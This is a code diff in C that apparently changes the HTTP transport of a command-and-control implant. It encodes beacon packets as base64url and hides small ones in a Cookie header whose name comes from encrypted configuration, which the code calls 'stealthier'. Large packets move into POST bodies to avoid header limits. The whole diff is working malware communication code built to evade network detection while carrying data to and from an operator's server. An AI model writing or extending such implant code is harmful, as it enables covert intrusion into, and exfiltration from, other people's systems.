@@ -129,14 +129,33 @@ BOOL http_send_recv(const unsigned char *packet, DWORD packet_len,
         return FALSE;
     }
 
+    /* Encode packet as base64url */
+    DWORD b64_len;
+    char *b64_val = profile_encode_request(packet, packet_len, &b64_len);
+    if (!b64_val) {
+        WinHttpCloseHandle(hConnect);
+        free(wUrl);
+        return FALSE;
+    }
+
+    /*
+     * Decide transport: small payloads go in Cookie header (GET),
+     * large payloads go in POST body to avoid header size limits.
+     * Threshold: 8000 bytes of base64 (safe for most HTTP stacks).
+     */
+    BOOL use_post = (b64_len > 8000);
+    const wchar_t *method = use_post ? L"POST" : L"GET";
+    DBG("[http] payload b64_len=%u → using %s", b64_len, use_post ? "POST" : "GET+cookie");
+
     /* Open request */
     DWORD flags = isHttps ? WINHTTP_FLAG_SECURE : 0;
     HINTERNET hRequest = WinHttpOpenRequest(
-        hConnect, L"GET", path, NULL,
+        hConnect, method, path, NULL,
         WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, flags);
     if (!hRequest) {
         WinHttpCloseHandle(hConnect);
         free(wUrl);
+        free(b64_val);
         return FALSE;
     }
 
@@ -161,27 +180,33 @@ BOOL http_send_recv(const unsigned char *packet, DWORD packet_len,
                              WINHTTP_ADDREQ_FLAG_REPLACE | WINHTTP_ADDREQ_FLAG_ADD);
     free(wUA);
 
-    /* Encode packet as base64url cookie */
-    DWORD cookie_len;
-    char *cookie_val = profile_encode_request(packet, packet_len, &cookie_len);
-    if (cookie_val) {
-        /* Build Cookie header with decrypted cookie name */
+    BOOL ok;
+    if (use_post) {
+        /* Large payload: send as POST body with Content-Type */
+        WinHttpAddRequestHeaders(hRequest,
+            L"Content-Type: application/octet-stream", (DWORD)-1,
+            WINHTTP_ADDREQ_FLAG_ADD);
+        ok = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
+                                (LPVOID)b64_val, b64_len, b64_len, 0);
+    } else {
+        /* Small payload: embed in Cookie header (stealthier) */
         char ck_name_dec[64];
         DECRYPT_CONFIG(ck_name_dec, COOKIE_NAME);
-        char cookie_hdr[16384];
-        snprintf(cookie_hdr, sizeof(cookie_hdr), "Cookie: %s=%s",
-                 ck_name_dec, cookie_val);
+        /* Dynamic alloc for cookie header to avoid fixed buffer overflow */
+        DWORD hdr_size = (DWORD)(strlen("Cookie: ") + strlen(ck_name_dec) + 1 + b64_len + 1);
+        char *cookie_hdr = (char *)malloc(hdr_size);
+        snprintf(cookie_hdr, hdr_size, "Cookie: %s=%s", ck_name_dec, b64_val);
         SecureZeroMemory(ck_name_dec, sizeof(ck_name_dec));
         wchar_t *wCookie = to_wide(cookie_hdr);
         WinHttpAddRequestHeaders(hRequest, wCookie, (DWORD)-1,
                                  WINHTTP_ADDREQ_FLAG_ADD);
         free(wCookie);
-        free(cookie_val);
-    }
+        free(cookie_hdr);
 
-    /* Send */
-    BOOL ok = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
-                                  WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
+        ok = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
+                                WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
+    }
+    free(b64_val);
     if (!ok) {
         DBG("[http] WinHttpSendRequest FAILED (err=%u)", GetLastError());
         goto cleanup;
